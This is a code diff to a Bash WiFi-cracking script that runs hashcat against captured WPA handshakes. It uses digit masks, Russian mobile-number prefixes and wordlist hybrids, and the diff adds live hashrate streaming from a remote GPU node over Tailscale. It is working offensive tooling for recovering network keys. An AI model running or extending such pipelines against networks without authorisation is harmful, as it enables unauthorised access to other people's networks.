@@ -63,7 +63,6 @@ _run_hashcat_with_speedometer() {
     shift 2
     local log_file="/tmp/hc_run_log_$$"
 
-    # Экранирование аргументов для предотвращения глоббинга масок
     (cd "$cmd_dir" && ./hashcat.exe "$@") > "$log_file" 2>&1 &
     local hc_pid=$!
 
@@ -82,7 +81,11 @@ _run_hashcat_with_speedometer() {
             fi
         fi
 
-        echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spinner[spin_idx]}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${current_speed}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed}s${NC}\033[K"
+        # 1. Отрисовка на экране локального сервера (в stderr)
+        echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spinner[spin_idx]}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${current_speed}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed}s${NC}\033[K" >&2
+
+        # 2. Вывод структурированной строки телеметрии в stdout (для сетевой трансляции)
+        echo "STAT|${pass_label}|${current_speed}|${elapsed}s|${spinner[spin_idx]}"
 
         sleep 0.1
         ((spin_idx = (spin_idx + 1) % 10))
@@ -93,9 +96,10 @@ _run_hashcat_with_speedometer() {
         fi
     done
 
-    echo -ne "\r\033[K"
+    echo -ne "\r\033[K" >&2
     rm -f "$log_file" 2>/dev/null
 }
+
 
 # Единый асинхронный/локальный конвейер выполнения всех 6 этапов
 run_wifi_crack_pipeline() {
@@ -108,7 +112,6 @@ run_wifi_crack_pipeline() {
     local hc_target_linux="${work_dir}/wifi_target_${current_pid}.hc22000"
     local win_target="C:\\hashcat\\work\\wifi_target_${current_pid}.hc22000"
 
-    # Конвертация
     if [[ "$cap_file" == *.hc22000 ]]; then
         cp "$cap_file" "$hc_target_linux"
     else
@@ -147,7 +150,7 @@ run_wifi_crack_pipeline() {
         return 0
     fi
 
-    # 2. PASS 1: Быстрая 8-значная цифровая маска (?d?d?d?d?d?d?d?d)
+    # 2. PASS 1: Цифровая маска (?d?d?d?d?d?d?d?d)
     _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 1: 8-Digit Mask (?d?d?d?d?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" '?d?d?d?d?d?d?d?d'
     cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')
 
@@ -188,7 +191,7 @@ run_wifi_crack_pipeline() {
         fi
     done
 
-    # 4. PASS 3: Региональная мобильная атака (Номера телефонов)
+    # 4. PASS 3: Региональная мобильная атака
     local mobile_prefixes=("7914" "7924" "7909" "7962" "7929" "7913")
     for prefix in "${mobile_prefixes[@]}"; do
         _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 3: Mobile Mask (${prefix}XXXXXXX)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "${prefix}?d?d?d?d?d?d?d"
@@ -203,7 +206,7 @@ run_wifi_crack_pipeline() {
         fi
     done
 
-    # 5. PASS 4: Гибридная атака (Слово из словаря + 4 цифры)
+    # 5. PASS 4: Гибридная атака (Слово + 4 цифры)
     for wl in "${wordlists[@]}"; do
         if [ -f "$wl" ] && [ -s "$wl" ]; then
             local win_wordlist
@@ -248,7 +251,7 @@ run_wifi_cracker() {
         return 1
     fi
 
-    # STAGE 2: Режим вычислений
+    # STAGE 2: Выбор режима вычислений
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 2/6 ] Select Compute Processing Node:${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Local Compute (Local Hashcat Pipeline)${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[2] Remote Cynosure Core Node (Desktop via Tailscale)${NC}"
@@ -267,15 +270,31 @@ run_wifi_cracker() {
         fi
 
         echo -e "${TXT_VOID}├─${TXT_RED_PLASMA}[ * ] Offloading handshake payload to remote Cynosure Node (${desktop_ip}:9999)...${NC}"
-        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}Awaiting remote GPU execution stream...${NC}"
+        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}Streaming live GPU compute telemetry from remote node...${NC}"
 
-        local remote_response
-        remote_response=$(curl -s -F "file=@${cap_file}" "http://${desktop_ip}:9999/upload_and_crack")
+        local remote_pass=""
+        local is_success=false
 
-        if [[ "$remote_response" == SUCCESS:* ]]; then
-            local clear_pass="${remote_response#SUCCESS:}"
+        # curl -N (без буферизации) считывает и отрисовывает телеметрию в реальном времени!
+        while IFS= read -r line; do
+            line=$(echo "$line" | tr -d '\r')
+            if [[ "$line" == STAT\|* ]]; then
+                local tag pass_label hashrate elapsed_time spin_char
+                IFS='|' read -r tag pass_label hashrate elapsed_time spin_char <<< "$line"
+
+                # Отрисовка интерактивного спидометра на экране ноутбука/телефона
+                echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spin_char}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${hashrate}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed_time}${NC}\033[K"
+            elif [[ "$line" == SUCCESS:* ]]; then
+                remote_pass="${line#SUCCESS:}"
+                is_success=true
+            fi
+        done < <(curl -N -s -F "file=@${cap_file}" "http://${desktop_ip}:9999/upload_and_crack")
+
+        echo -ne "\r\033[K" # Стираем строчку спидометра
+
+        if [ "$is_success" = true ]; then
             echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] REMOTE NODE SUCCESS: RECOVERED WIRELESS KEY:${NC}"
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${remote_pass} ]${NC}"
             echo -e "$sep_bot\n"
             ai_speak "To eliminate your kind is effortless..."
             sleep 1s
@@ -290,7 +309,7 @@ run_wifi_cracker() {
         return 0
     fi
 
-    # STAGE 3 - 5: Локальное выполнение единого 6-этапного конвейера
+    # Локальное выполнение
     echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] Launching 6-Stage Hardware Decryption Pipeline...${NC}"
     local result
     result=$(run_wifi_crack_pipeline "$cap_file")
